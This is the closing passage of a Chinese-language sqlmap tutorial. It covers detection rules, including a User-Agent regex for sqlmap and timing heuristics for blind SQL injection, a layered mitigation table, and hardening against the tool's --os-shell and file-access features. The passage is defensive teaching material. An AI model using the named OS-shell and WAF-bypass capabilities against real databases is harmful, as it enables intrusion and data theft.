- User-Agent 匹配 (?i)sqlmap
- 单源 IP 在 60s 内对同一 URL 参数的请求数 > 100 且响应长度高度相似 → 疑似盲注
- 单源 IP 的请求响应时间出现规律性的固定延迟（如 5s±0.2s）→ 疑似时间盲注
```

### 分层缓解

| 层次 | 措施 | 效果 |
|------|------|------|
| **根因** | **参数化查询 / 预编译语句** | **彻底消除 SQL 注入**——这是唯一真正的修复 |
| 代码层 | 输入校验（白名单）、最小权限数据库账号 | 减小影响范围 |
| 数据层 | 关闭 `secure_file_priv` 之外的文件权限；数据库账号不用 DBA | 阻断文件读写与 OS 命令 |
| 网络层 | WAF 规则拦截 payload 关键字 | 提高攻击成本，但可被 tamper 绕过 |
| 行为层 | 速率限制 + 参数级异常检测 | 抑制盲注（盲注本质需要海量请求） |
| 监控层 | 数据库审计日志（记录异常 SQL 模式） | **检测绕过 WAF 的攻击** |

### 最有价值的两个检测点

1. **数据库侧的审计日志**：无论 WAF 是否被绕过，**异常 SQL 一定会到达数据库**。开启 MySQL 的 general log 或 PostgreSQL 的 `log_statement = all`（或使用数据库审计产品），对"非常规查询模式"告警——这是最难绕过的检测层。
2. **固定延迟模式**：时间盲注在响应时间上会形成**肉眼可见的规律**（如每次精确 5 秒）。APM/网关的响应时间分布监控能抓住这个特征。

### 对 `--os-shell` 的专门防护

- **绝不给 Web 应用的数据库账号 DBA 或 FILE 权限**。这一条直接废掉 sqlmap 的文件读写与 `--os-shell` 能力。
- MySQL：`secure_file_priv` 设为一个受限目录（或空字符串时仍受限）；禁用 `FILE` 权限。
- MSSQL：禁用 `xp_cmdshell`。
- PostgreSQL：限制 `COPY ... TO PROGRAM` 的权限（需要超级用户）。

## 10. 参考

- 官方站点：<https://sqlmap.org/>
- 官方仓库（含 Wiki 与全部 tamper 脚本）：<https://github.com/sqlmapproject/sqlmap>
- 使用文档 Wiki：<https://github.com/sqlmapproject/sqlmap/wiki/Usage>
- Kali 工具页：<https://www.kali.org/tools/sqlmap/>
- man page：`man sqlmap`（简要版）；完整参数用 `sqlmap -hh`
- 用法核实：本教程参数取自 `sqlmap` 的 man page 与上游 `lib/parse/cmdline.py` 中的实际 `add_argument` 定义（共 270 个选项，已逐项提取核对）

---

**相关教程**：[commix](commix.md) ｜ [wpscan](wpscan.md) ｜ [wfuzz](wfuzz.md) ｜ [ffuf](ffuf.md) ｜ [wafw00f](wafw00f.md) ｜ [nuclei](../02-漏洞分析/nuclei.md) ｜ [nikto](../02-漏洞分析/nikto.md)
